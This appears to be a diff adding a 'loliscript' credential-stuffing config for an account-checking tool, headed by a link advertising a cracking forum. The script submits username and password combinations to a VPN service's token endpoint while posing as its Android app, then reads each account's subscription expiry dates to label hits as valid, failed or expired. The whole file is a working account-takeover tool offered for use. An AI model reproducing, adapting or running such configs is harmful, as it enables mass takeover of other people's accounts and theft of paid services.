@@ -1,0 +1,47 @@
+Join our cracking forum for more resources/configs: http://paradisebay.co
+
+
+
+//////////////Here's the loliscript:
+REQUEST POST "https://zwyr157wwiu6eior.com/v1/users/tokens" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: NordApp android (playstore/2.8.6) Android 8.1.0" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Unauthorized" 
+  KEYCHAIN Retry OR 
+    KEY "502: Bad gateway" 
+PARSE "<SOURCE>" LR "\"token\":\"" "\"" Recursive=FALSE -> VAR "TOKEN" 
+FUNCTION Base64Encode "token:<TOKEN>" -> VAR "ENCTOKEN" 
+REQUEST GET "https://zwyr157wwiu6eior.com/v1/users/services" AutoRedirect=TRUE 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: NordApp android (playstore/2.8.6) Android 8.1.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Basic <ENCTOKEN>" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "created_at" 
+  KEYCHAIN Failure OR 
+    KEY "[]" 
+  KEYCHAIN Custom "FREE" OR
+    KEY "<SOURCE>" Contains "00:00:00"
+    KEY "<SOURCE>" Contains "expires_at\":\"2010"
+    KEY "<SOURCE>" Contains "expires_at\":\"2011"
+    KEY "<SOURCE>" Contains "expires_at\":\"2012"
+    KEY "<SOURCE>" Contains "expires_at\":\"2013"
+    KEY "<SOURCE>" Contains "expires_at\":\"2014"
+    KEY "<SOURCE>" Contains "expires_at\":\"2015"
+    KEY "<SOURCE>" Contains "expires_at\":\"2016"
+    KEY "<SOURCE>" Contains "expires_at\":\"2017"
+    KEY "<SOURCE>" Contains "expires_at\":\"2018"
+    KEY "<SOURCE>" Contains "expires_at\":\"2019-01"
+    KEY "<SOURCE>" Contains "expires_at\":\"2019-02"
+    KEY "<SOURCE>" Contains "expires_at\":\"2019-03"
+    KEY "<SOURCE>" Contains "expires_at\":\"2019-04"
+    KEY "<SOURCE>" Contains "expires_at\":\"2019-05"
+    KEY "<SOURCE>" Contains "expires_at\":\"2019-06"
+PARSE "<SOURCE>" JSON "expires_at" Recursive=FALSE -> CAP "EXPIRATION"
